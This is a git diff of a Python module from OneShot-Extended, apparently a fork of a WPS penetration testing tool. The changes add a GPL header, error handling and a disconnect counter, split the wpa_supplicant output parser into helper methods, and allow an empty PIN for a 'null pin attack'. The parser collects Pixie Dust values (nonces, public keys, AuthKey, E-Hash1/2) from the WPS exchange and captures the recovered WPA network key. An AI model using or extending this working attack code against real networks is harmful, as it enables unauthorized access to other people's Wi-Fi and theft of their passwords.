@@ -1,3 +1,16 @@
+#  OneShot-Extended (WPS penetration testing utility) is a fork of the tool with extra features
+#  Copyright (C) 2025 chickendrop89
+#
+#  This program is free software; you can redistribute it and/or
+#  modify it under the terms of the GNU General Public License
+#  as published by the Free Software Foundation; either version 2
+#  of the License, or (at your option) any later version.
+#
+#  This program is distributed in the hope that it will be useful,
+#  but WITHOUT ANY WARRANTY; without even the implied warranty of
+#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+#  GNU General Public License for more details.
+
 import socket
 import tempfile
 import os
@@ -55,6 +68,8 @@ class Initialize:
         self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
         self.RETSOCK.bind(self.RES_SOCKET_FILE)
 
+        self.DISCONNECT_COUNT = 0
+
     @staticmethod
     def _getHex(line: str) -> str:
         """Filters WPA Supplicant output, and removes whitespaces"""
@@ -92,7 +107,8 @@ class Initialize:
         generator    = src.wps.generator.WPSpin()
         collector    = src.wifi.collector.WiFiCollector()
 
-        if not pin:
+        # Allow empty string ('') as valid pin (e.g., for null pin attack)
+        if pin is None:
             if pixiemode:
                 try:
                     filename = f'''{pixiewps_dir}{bssid.replace(':', '').upper()}.run'''
@@ -165,16 +181,20 @@ class Initialize:
             f'-c{self.TEMPCONF}'
         ])
 
-        self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
-            encoding='utf-8', stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-        )
+        try:
+            self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                encoding='utf-8'
+            )
+        except (subprocess.CalledProcessError, FileNotFoundError) as error:
+            return print (f'[!] Failed to open wpa_supplicant \n {error}')
 
         # Waiting for wpa_supplicant control interface initialization
         while True:
             ret = self.WPAS.poll()
 
             if ret is not None and ret != 0:
-                raise ValueError('wpa_supplicant returned an error: ' + self.WPAS.communicate()[0])
+                print(f'[!] wpa_supplicant returned an error: \n {self.WPAS.communicate()[0]}')
             if os.path.exists(self.WPAS_CTRL_PATH):
                 break
 
@@ -195,9 +215,8 @@ class Initialize:
         self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
 
     def _handleWpas(self, pixiemode: bool = False, pbc_mode: bool = False, verbose: bool = None) -> bool:
-        """Handles WPA supplicant output and updates connection status."""
+        """Handles WPA supplicant output and updates connection status"""
 
-        # pylint: disable=invalid-name
         line = self.WPAS.stdout.readline()
 
         if not verbose:
@@ -211,99 +230,133 @@ class Initialize:
         if verbose:
             sys.stderr.write(line + '\n')
 
+        # Handle WPS protocol messages
         if line.startswith('WPS: '):
-            if 'M2D' in line:
-                print('[-] Received WPS Message M2D')
-                src.utils.die('[-] Error: AP is not ready yet, try later')
-            if 'Building Message M' in line:
-                n = int(line.split('Building Message M')[1])
-                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
-                print(f'[*] Sending WPS Message M{n}…')
-            elif 'Received M' in line:
-                n = int(line.split('Received M')[1])
-                self.CONNECTION_STATUS.LAST_M_MESSAGE = n
-                print(f'[*] Received WPS Message M{n}')
-                if n == 5:
-                    print('[+] The first half of the PIN is valid')
-            elif 'Received WSC_NACK' in line:
-                self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
-                print('[-] Received WSC NACK')
-                print('[-] Error: wrong PIN code')
-            elif 'Enrollee Nonce' in line and 'hexdump' in line:
-                self.PIXIE_CREDS.E_NONCE = self._getHex(line)
-                assert len(self.PIXIE_CREDS.E_NONCE) == 16 * 2
-                if pixiemode:
-                    print(f'[P] E-Nonce: {self.PIXIE_CREDS.E_NONCE}')
-            elif 'DH own Public Key' in line and 'hexdump' in line:
-                self.PIXIE_CREDS.PKR = self._getHex(line)
-                assert len(self.PIXIE_CREDS.PKR) == 192 * 2
-                if pixiemode:
-                    print(f'[P] PKR: {self.PIXIE_CREDS.PKR}')
-            elif 'DH peer Public Key' in line and 'hexdump' in line:
-                self.PIXIE_CREDS.PKE = self._getHex(line)
-                assert len(self.PIXIE_CREDS.PKE) == 192 * 2
-                if pixiemode:
-                    print(f'[P] PKE: {self.PIXIE_CREDS.PKE}')
-            elif 'AuthKey' in line and 'hexdump' in line:
-                self.PIXIE_CREDS.AUTHKEY = self._getHex(line)
-                assert len(self.PIXIE_CREDS.AUTHKEY) == 32 * 2
-                if pixiemode:
-                    print(f'[P] AuthKey: {self.PIXIE_CREDS.AUTHKEY}')
-            elif 'E-Hash1' in line and 'hexdump' in line:
-                self.PIXIE_CREDS.E_HASH1 = self._getHex(line)
-                assert len(self.PIXIE_CREDS.E_HASH1) == 32 * 2
-                if pixiemode:
-                    print(f'[P] E-Hash1: {self.PIXIE_CREDS.E_HASH1}')
-            elif 'E-Hash2' in line and 'hexdump' in line:
-                self.PIXIE_CREDS.E_HASH2 = self._getHex(line)
-                assert len(self.PIXIE_CREDS.E_HASH2) == 32 * 2
-                if pixiemode:
-                    print(f'[P] E-Hash2: {self.PIXIE_CREDS.E_HASH2}')
-            elif 'Network Key' in line and 'hexdump' in line:
-                self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
-                self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')
-        elif ': State: ' in line:
-            if '-> SCANNING' in line:
-                self.CONNECTION_STATUS.STATUS = 'scanning'
-                print('[*] Scanning…')
+            return self._handle_wps_messages(line, pixiemode)
+
+        # Handle connection state changes
+        return self._handle_connection_states(line, pbc_mode)
+
+    def _handle_wps_messages(self, line: str, pixiemode: bool) -> bool:
+        """Handle WPS-specific protocol messages"""
+
+        if 'M2D' in line:
+            print('[-] Received WPS Message M2D')
+            src.utils.die('[!] Error: AP is not ready yet, try later')
+
+        if 'Building Message M' in line:
+            n = int(line.split('Building Message M')[1])
+            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
+            print(f'[*] Sending WPS Message M{n}…')
+
+        elif 'Received M' in line:
+            n = int(line.split('Received M')[1])
+            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
+            print(f'[*] Received WPS Message M{n}')
+            if n == 5:
+                print('[*] The first half of the PIN is valid')
+
+        elif 'Received WSC_NACK' in line:
+            self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
+            print('[-] Received WSC NACK')
+            print('[!] Error: wrong PIN code')
+
+        elif 'Enrollee Nonce' in line and 'hexdump' in line:
+            self._handle_pixie_data('E_NONCE', line, 16 * 2, pixiemode)
+
+        elif 'DH own Public Key' in line and 'hexdump' in line:
+            self._handle_pixie_data('PKR', line, 192 * 2, pixiemode)
+
+        elif 'DH peer Public Key' in line and 'hexdump' in line:
+            self._handle_pixie_data('PKE', line, 192 * 2, pixiemode)
+
+        elif 'AuthKey' in line and 'hexdump' in line:
+            self._handle_pixie_data('AUTHKEY', line, 32 * 2, pixiemode)
+
+        elif 'E-Hash1' in line and 'hexdump' in line:
+            self._handle_pixie_data('E_HASH1', line, 32 * 2, pixiemode)
+
+        elif 'E-Hash2' in line and 'hexdump' in line:
+            self._handle_pixie_data('E_HASH2', line, 32 * 2, pixiemode)
+
+        elif 'Network Key' in line and 'hexdump' in line:
+            self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
+            self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')
+
+        return True
+
+    def _handle_connection_states(self, line: str, pbc_mode: bool) -> bool:
+        """Handle various connection state changes"""
+
+        if ': State: ' in line and '-> SCANNING' in line:
+            self.CONNECTION_STATUS.STATUS = 'scanning'
+            print('[*] Scanning…')
+
         elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
             self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
             print('[-] wpa_supplicant returned WPS-FAIL')
-#        elif 'NL80211_CMD_DEL_STATION' in line:
-#            print("[-] Something else is trying to use the interface!")
+
         elif 'Trying to authenticate with' in line:
             self.CONNECTION_STATUS.STATUS = 'authenticating'
             if 'SSID' in line:
-                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
             print('[*] Authenticating…')
+
         elif 'Authentication response' in line:
-            print('[+] Authenticated')
+            print('[*] Authenticated')
+
         elif 'Trying to associate with' in line:
             self.CONNECTION_STATUS.STATUS = 'associating'
             if 'SSID' in line:
-                self.CONNECTION_STATUS.ESSID = codecs.decode('\''.join(line.split('\'')[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
+                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
             print('[*] Associating with AP…')
+
         elif ('Associated with' in line) and (self.INTERFACE in line):
             bssid = line.split()[-1].upper()
             if self.CONNECTION_STATUS.ESSID:
                 print(f'[+] Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
             else:
                 print(f'[+] Associated with {bssid}')
+
         elif 'EAPOL: txStart' in line:
             self.CONNECTION_STATUS.STATUS = 'eapol_start'
             print('[*] Sending EAPOL Start…')
+
         elif 'EAP entering state IDENTITY' in line:
             print('[*] Received Identity Request')
+
         elif 'using real identity' in line:
             print('[*] Sending Identity Response…')
+
         elif 'WPS-TIMEOUT' in line:
-            print('[-] Warning: Received WPS-TIMEOUT')
+            print('[-] Received WPS-TIMEOUT. Something might be wrong with the interface ⚠')
+
+        elif 'NL80211_CMD_DEL_STATION' in line:
+            self.DISCONNECT_COUNT += 1
+            if self.DISCONNECT_COUNT == 5:
+                print('[-] Received NL80211 DEL_STATION too many times. There is interference ⚠')
+
         elif pbc_mode and ('selected BSS ' in line):
             bssid = line.split('selected BSS ')[-1].split()[0].upper()
             self.CONNECTION_STATUS.BSSID = bssid
             print(f'[*] Selected AP: {bssid}')
 
         return True
+
+    def _handle_pixie_data(self, attr: str, line: str, expected_len: int, pixiemode: bool):
+        """Handle pixie dust attack related data"""
+        hex_value = self._getHex(line)
+        setattr(self.PIXIE_CREDS, attr, hex_value)
+        assert len(hex_value) == expected_len
+        if pixiemode:
+            print(f'[P] {attr}: {hex_value}')
+
+    def _decode_essid(self, line: str) -> str:
+        """Decode ESSID from wpa_supplicant output"""
+        return codecs.decode(
+            '\''.join(line.split('\'')[1:-1]),
+            'unicode-escape'
+        ).encode('latin1').decode('utf-8', errors='replace')
 
     def _wpsConnection(self, bssid: str = None, pin: str = None, pixiemode: bool = False,
                        pbc_mode: bool = False, verbose: bool = None) -> bool:
@@ -352,8 +405,14 @@ class Initialize:
     def _cleanup(self):
         """Terminates connections and removes temporary files"""
 
-        self.RETSOCK.close()
-        self.WPAS.terminate()
+        try:
+            self.RETSOCK.close()
+            self.WPAS.terminate()
+        except ImportError:
+            # Ignore errors during interpreter shutdown
+            # Exception: sys.meta_path is None, Python is likely shutting down
+            pass
+
         os.remove(self.RES_SOCKET_FILE)
         shutil.rmtree(self.TEMPDIR, ignore_errors=True)
         os.remove(self.TEMPCONF)
